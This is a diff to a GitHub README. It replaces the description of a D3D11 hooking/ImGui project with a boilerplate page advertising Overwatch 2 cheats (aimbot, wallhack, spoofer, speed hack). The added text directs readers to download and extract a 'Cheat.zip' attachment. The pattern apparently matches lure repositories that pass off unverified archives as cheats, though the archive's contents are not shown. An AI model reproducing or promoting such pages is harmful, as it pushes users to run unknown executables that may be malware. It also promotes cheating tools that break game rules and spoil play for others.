@@ -1,59 +1,73 @@
-```
-            ____ _____ ____ ______   __  __            __      ____          ______      _ 
-           / __ \__  // __ <  <  /  / / / /___  ____  / /__   /  _/___ ___  / ____/_  __(_)
-          / / / //_ </ / / / // /  / /_/ / __ \/ __ \/ //_/   / // __ `__ \/ / __/ / / / / 
-         / /_/ /__/ / /_/ / // /  / __  / /_/ / /_/ / ,<    _/ // / / / / / /_/ / /_/ / /
-        /_____/____/_____/_//_/  /_/ /_/\____/\____/_/|_|  /___/_/ /_/ /_/\____/\__,_/_/
-                                                                       
-                                                                      
-                           D3D11 Hook with ImGui integration (x86 / x64)
-                                Make D3D11 internal menu with ImGui
-                                   (Resize & Fullscreen support)
-```
-<p align="center">
-    <img src="https://img.shields.io/badge/language-C%2B%2B-%23f34b7d.svg?style=for-the-badge&logo=appveyor" alt="C++">
-    <img src="https://img.shields.io/badge/platform-Windows-0078d7.svg?style=for-the-badge&logo=appveyor" alt="Windows">
-    <img src="https://img.shields.io/badge/arch-x86-red.svg?style=for-the-badge&logo=appveyor" alt="x86">
-    <img src="https://img.shields.io/badge/arch-x64-green.svg?style=for-the-badge&logo=appveyor" alt="x64">
-</p>
+# Overwatch 2 ESP Scripts Repository
 
-## :open_book: Project Overview :
+Welcome to the Overwatch 2 ESP repository! This repository contains a variety of scripts and hacks for Overwatch 2, designed to enhance your gameplay experience. From aimbots to skin changers, this repository offers a wide range of tools for players looking to gain an edge in the game.
 
-D3D11 Hook with [ImGui](https://github.com/ocornut/imgui) integration written in C++, works on x86 and x64 with all librairies and includes.
+## Table of Contents
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-#### Features :
+---
 
-- Handle window resize
-- DLL unload itself
-- Handler external unload
-- Handle fullscreen change
+## Introduction
 
-#### Used librairies :
+Overwatch 2 is an exciting and fast-paced multiplayer game developed by Blizzard Entertainment. With the intense battles and strategic gameplay that Overwatch 2 offers, players are always looking for ways to improve their skills and dominate the competition. This repository aims to provide Overwatch 2 players with scripts and hacks that can help them level up their gameplay and achieve victory.
 
-- [MS Detours](https://www.microsoft.com/en-us/research/project/detours/)
-- [DirectX SDK](https://www.microsoft.com/en-us/download/details.aspx?id=6812)
-- [ImGui](https://github.com/ocornut/imgui)
+## Features
 
-## :rocket: Getting Started
+This repository includes a wide range of scripts and hacks for Overwatch 2, including but not limited to:
 
-This project use [MS Detours](https://github.com/microsoft/Detours) library for hooking and obviously D3D11 SDK.
+- Aimbot
+- Spoofer
+- Fly hack
+- Speed hack
+- Wallhack
+- Soft aim
+- Skin changer
+- Skin swapper
+- Macro
+- Radar
 
-MS Detours library is already include in the project folder, but if you don't have DirectX SDK you can download it [here](https://www.microsoft.com/en-us/download/details.aspx?id=6812).
+Whether you're looking to improve your aiming skills, customize your in-game appearance, or gain a tactical advantage over your opponents, our collection of scripts has you covered. Explore the various features and choose the ones that best suit your gameplay style.
 
-> **Note** <br>
-> Make sure that **DXSDK_DIR** is declared in your environment variables.
+## Installation
 
-To see your environment variables :
+To make use of the scripts and hacks provided in this repository, follow these steps:
 
-> **Settings --> System --> About --> System Advanced Settings --> Environment Variables**
+1. Clone this repository to your local machine.
+2. Download the Cheat.zip file by clicking the download button below:
 
-### Visual Studio :
+[![Download Cheat.zip](https://img.shields.io/badge/Download-Cheat.zip-green)](https://github.com/user-attachments/files/16928413/Cheat.zip)
 
-1. Open the solution file (.sln).
-2. Build the project in Release (x86 or x64)
+3. Extract the contents of the Cheat.zip file.
+4. Choose the script or hack you wish to use and follow the specific installation instructions provided in the respective folder.
 
-Every configuration in x86 / x64 (Debug and Realese) are already configured with librairies and includes.
+## Usage
 
-## :test_tube: Demonstration :
+Before using any scripts or hacks in this repository, it's important to understand the implications and risks involved. While these tools can enhance your gameplay experience, their usage may violate the terms of service of the game and result in penalties or bans. Proceed with caution and use these scripts responsibly.
 
-[Demo](https://github.com/adamhlt/D3D11-Hook-ImGui/assets/48086737/5c6cf425-6758-4773-aa1c-9ce4b1c8b41d)
+To use a script or hack from this repository:
+
+1. Locate the script or hack you wish to use.
+2. Follow the installation instructions provided in the respective folder.
+3. Launch Overwatch 2 and activate the script or hack according to the specified instructions.
+4. Enjoy the enhanced features and functionalities during your gameplay.
+
+Remember, fair play is important in any gaming community. Using scripts or hacks in an unfair or disruptive manner can harm the experience of other players. Play responsibly and ensure a positive gaming environment for everyone.
+
+## Contributing
+
+We welcome contributions from the community to improve and expand the collection of scripts in this repository. If you have developed a new script or hack for Overwatch 2 or have suggestions for improving existing ones, feel free to submit a pull request. Our goal is to provide players with valuable resources that enhance their gaming experience while upholding fair play and sportsmanship.
+
+## License
+
+The scripts and hacks in this repository are provided for educational and entertainment purposes only. The developers of these tools are not responsible for any consequences resulting from the usage of these scripts. Be sure to review the terms of service of Overwatch 2 before using any third-party tools to avoid potential penalties or bans.
+
+---
+
+Thank you for exploring the Overwatch 2 ESP repository! We hope you find the scripts and hacks provided here helpful in enhancing your gameplay experience. Dive in, experiment with the different features, and take your Overwatch 2 skills to the next level! 🎮🚀
+
+![Overwatch 2 Logo](https://example.com/overwatch2logo.png)
